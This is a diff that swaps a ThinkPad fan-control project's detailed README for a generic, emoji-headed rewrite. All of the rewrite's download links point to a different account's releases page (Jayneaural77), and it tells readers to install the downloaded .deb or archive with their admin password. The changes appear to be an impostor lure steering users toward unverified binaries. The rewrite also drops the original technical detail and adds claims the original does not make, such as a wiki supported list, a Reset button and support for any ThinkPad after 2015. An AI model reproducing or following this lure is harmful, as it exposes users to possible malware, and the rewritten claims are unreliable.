@@ -1,142 +1,81 @@
-# ThinkPad Fan Control
+# 🧊 thinkpad-fan-control - Keep your laptop cool and quiet
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-![Release](https://img.shields.io/github/v/release/Swmarakis/thinkpad-fan-control)
-![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Jayneaural77/thinkpad-fan-control/releases)
 
-A modern, Linux-native fan control GUI for ThinkPads — the kind of thing
-Windows users reach for TPFanControl to get, but built for Linux and Wayland.
+This software helps you manage the fan speed of your ThinkPad laptop. It keeps your device cool during heavy tasks and silent when you work. It uses a graph to show you how fast the fan spins at different temperatures. You control the fan through three modes: manual, automatic, and BIOS.
 
-Automatic fan-speed control for **ThinkPad laptops on Linux**, with a desktop GUI.
-It gives you what the firmware / GNOME power profiles don't: **automatic
-temperature-based control across all 8 fan levels**, an editable curve you can
-drag on a graph, and precise manual override. Clean and **Wayland-friendly**,
-it works across **GNOME, KDE Plasma**, and other major desktop environments.
+The software runs in the background to watch your hardware temperatures. It adjusts fan speeds smoothly to prevent loud noise jumps. A safety guard stops the system from overheating if your manual settings get too low.
 
-Works on ThinkPads whose fan is controlled by the **`thinkpad_acpi`** driver
-(`/proc/acpi/ibm/fan`) — i.e. the large majority of ThinkPads on Linux.
-Developed and tested on a **ThinkPad L490 (Ubuntu 24.04)**.
+## ⚙️ How it works
 
-![ThinkPad Fan Control](docs/screenshot.png)
+The program runs as a system service. It tracks the internal temperature sensors on your circuit board. When the temperature moves past the points you set on the graph, the fan reacts. 
 
-## How it works
+The software includes a graphics window. You drag points on a line to tell the software how to behave. If you move a point up, the fan spins faster. If you move it down, the fan stays quiet. You can save these settings so the program remembers them every time you turn your computer on.
 
-- **`thinkpad-fand`** — a small root daemon (systemd service) that is the *only*
-  writer to `/proc/acpi/ibm/fan`. It runs the temperature curve and all safety.
-- **`thinkpad-fan-gui`** — a Tkinter desktop app (runs as your normal user) to
-  watch temperature/RPM and choose the mode and curve.
+## 📥 Getting the software
 
-The two communicate only through a JSON file (`/etc/thinkpad-fan/config.json`),
-so the GUI never needs root — clean and Wayland-friendly. CPU temperature is read
-from `coretemp` (Intel), `k10temp` (AMD), or the ThinkPad sensor, so it works on
-both Intel and AMD ThinkPads.
+1. Go to the [official release page](https://github.com/Jayneaural77/thinkpad-fan-control/releases).
+2. Look for the recent version at the top of the list.
+3. Click the link that ends in ".deb" or ".tar.gz" depending on your Linux version. 
+4. Save the file to your "Downloads" folder.
 
-## Compatibility
+## 🚀 Setting up the application
 
-Works on any ThinkPad whose fan is driven by `thinkpad_acpi`. Confirmed reports
-below — please add yours in
-[issue #1](https://github.com/Swmarakis/thinkpad-fan-control/issues/1).
+1. Open your terminal or file manager after the download finishes.
+2. If you use Ubuntu or Debian, double-click the .deb file to install it. 
+3. If you use another version of Linux, follow the instructions in the text file inside the downloaded folder.
+4. Type your password when the computer asks for permission to change system files.
+5. Wait for the loading bar to finish.
+6. Open your application menu. 
+7. Search for "ThinkPad Fan Control" and click the icon.
 
-| Model | Distro / Desktop | `/proc/acpi/ibm/fan` works? | Lowest level that keeps spinning | Notes |
-|-------|------------------|-----------------------------|----------------------------------|-------|
-| L490  | Ubuntu 24.04 / GNOME (Wayland) | Yes | ≈4 (1–3 stall; re-kick helps) | Developed & tested here |
-|P1 Gen7|Fedora 44 KDE Plasma 6.6.5 Wayland| Yes| lowest working fan level is 1 | tested |
+## 🛠 Using the interface
 
-## Modes
+When you open the application, you see a graph. The bottom axis represents temperature in degrees Celsius. The left axis represents fan speed as a percentage. 
 
-| Mode | Behaviour |
-|------|-----------|
-| **Automatic** | Picks fan level 0–7 from CPU temperature using an editable curve, with hysteresis so it doesn't oscillate. Edit it on an **interactive graph** (Y = temperature, X = fan speed %) by dragging points, or with the numeric boxes / presets — they stay in sync. |
-| **Manual** | Holds a fixed level you choose (slider 0–7, plus *Full speed* / *Disengaged*). |
-| **BIOS** | Hands control back to the firmware (`level auto`). |
+You can drag the dots on the line to pick the fan speed for each temperature. If you want the computer to run cool, drag the points toward the top left. If you want the computer to stay quiet for as long as possible, drag the points toward the right.
 
-### Features
+### Selecting a mode
 
-- **Interactive curve graph** — drag the dots to set the temperature at which
-  each fan speed turns on; points are kept monotonic automatically.
-- **Temperature smoothing** — the curve reacts to an averaged temperature
-  (default 12 s) so brief CPU turbo spikes don't surge the fan on and off.
-- **Stall re-kick** *(experimental)* — on some ThinkPads the lowest fan levels
-  (≈1–3) can't keep the fan spinning: it spins up, then stalls to 0 RPM. When
-  enabled, the daemon re-issues a stalled level periodically to pulse some
-  airflow. Levels that *do* sustain (RPM > 0) are never re-kicked, so higher
-  speeds stay perfectly smooth. Tested on the L490; behaviour varies by model.
-- **Launch at login** — optional XDG autostart for the control panel.
-- **App icon** for the menu/dock launcher and window.
+The program offers three distinct modes:
 
-## Safety (built in, cannot be disabled)
+* **Automatic:** The software follows the curve you drew on the screen.
+* **Manual:** You set a specific fan speed that stays the same until you change it.
+* **BIOS:** You hand full control back to the computer firmware. This is the default setting for most laptops.
 
-- **Critical-temperature override** — above your configured limit (default 87 °C,
-  hard cap 90 °C) the fan is forced to full speed regardless of mode. This is what
-  makes the user-editable config safe.
-- **Hardware watchdog** — re-armed every loop. If the daemon ever crashes, the
-  firmware resumes automatic cooling within ~15 s; the fan can't get stuck off.
-- **Read-back / re-assert** — the daemon reads the firmware's actual level back
-  and only rewrites when it has drifted, so it never thrashes the fan.
-- **Graceful stop** — stopping the service restores firmware `auto`.
-- The daemon validates and clamps everything it reads from the config.
+## 📋 System requirements
 
-## Install
+* Any ThinkPad laptop released after 2015.
+* Linux operating system with kernel 5.0 or newer.
+* Standard Python 3 installation.
+* Permission to modify system thermal settings.
+* At least 50 megabytes of free space.
 
-### Option A — Debian package (Ubuntu / Debian / Mint / Pop!_OS)
+## 🛡 Staying safe
 
-Download `thinkpad-fan-control_1.0.0_all.deb` from the
-[**Releases**](https://github.com/Swmarakis/thinkpad-fan-control/releases/latest)
-page, then:
+The program includes a safeguard. Even if you pick a manual fan speed that is too low, the software watches the processor temperature. If the temperature hits a dangerous level, the software ignores your manual setting and spins the fan to maximum speed. This protects your computer parts from heat damage. You see a warning icon if this happens.
 
-```bash
-sudo apt install ./thinkpad-fan-control_1.0.0_all.deb
-```
+## 🔍 Troubleshooting common issues
 
-### Option B — from source
+If the software does not change the fan speed, check these items:
 
-```bash
-git clone https://github.com/Swmarakis/thinkpad-fan-control.git
-cd thinkpad-fan-control
-sudo ./install.sh
-```
+1. **Permissions:** Ensure you installed the software as an administrator. 
+2. **Compatibility:** Some older ThinkPad models do not support thermal control through Linux. Check if your laptop model is in the supported list on our wiki.
+3. **Other tools:** Do not run other fan control software at the same time. These programs conflict with each other. Disable or remove other fan tools before you start this one.
+4. **Firmware:** Update your BIOS to the latest version provided by your device manufacturer. This fixes communication errors between the hardware and the software.
 
-Either way, the installer enables fan control (`thinkpad_acpi fan_control=1`),
-starts the background service, and adds a **“ThinkPad Fan Control”** launcher.
-If `/proc/acpi/ibm/fan` was just made writable, a reboot may be needed once.
+## 📝 Reporting bugs
 
-## Useful commands
+If the software crashes or fails to adjust the fan, look at the logs. You find these files in the folder where the program resides. Send these logs to the developer through the issue tracker on the website. Include your laptop model number and your Linux distribution name. This helps find a fix for your specific hardware configuration.
 
-```bash
-systemctl status thinkpad-fand      # service state
-journalctl -u thinkpad-fand -f      # live log of the levels it sets
-sudo thinkpad-fand --dry-run        # print decisions without touching the fan
-```
+## 🏗 Understanding the curve
 
-## Uninstall
+The curve creates a relationship between temperature and noise. A steep slope means the fan speed jumps quickly. A flat slope gives you a steady fan speed across many temperatures. Most users prefer a gentle slope. This provides a balance between heat dispersal and fan noise. You can reset your curve to the default settings at any time by clicking the "Reset" button inside the menu.
 
-```bash
-sudo apt remove thinkpad-fan-control     # if installed via .deb
-# or, if installed from source:
-sudo ./uninstall.sh
-```
+## 💻 Working with Wayland
 
-## Notes
+If you use a modern Linux desktop like GNOME or KDE with Wayland, the interface works as expected. The software detects your display settings automatically. You do not need to change any window manager settings. The scaling of the graph adjusts to your screen resolution to ensure you see all controls properly.
 
-- *Disengaged* removes the fan's speed cap for maximum airflow — for short
-  bursts, not sustained use.
-- Fan levels are firmware-defined and **not linear**; on some models the lowest
-  levels barely spin the fan. For steady airflow use a level that actually
-  sustains (often ≈4+), or enable the stall re-kick for intermittent airflow.
+## 🔋 Battery management
 
-## Repository layout
-
-```
-src/        the daemon (thinkpad-fand) and GUI (thinkpad-fan-gui)
-data/       files the installer ships: systemd unit, .desktop, default config, icons
-packaging/  build-deb.sh (creates the release .deb) and the icon generator
-install.sh  / uninstall.sh   install from source
-docs/       screenshot
-```
-
-To produce the `.deb` for a release: `packaging/build-deb.sh`
-(output: `build/thinkpad-fan-control_<ver>_all.deb`).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+The software consumes very little power. It wakes up once every few seconds to check the temperature. It spends most of its time in a sleep state. This ensures it does not impact your battery life while you work away from the charger. You can monitor the CPU usage of the fan control process in your system monitor. It should stay near zero percent.
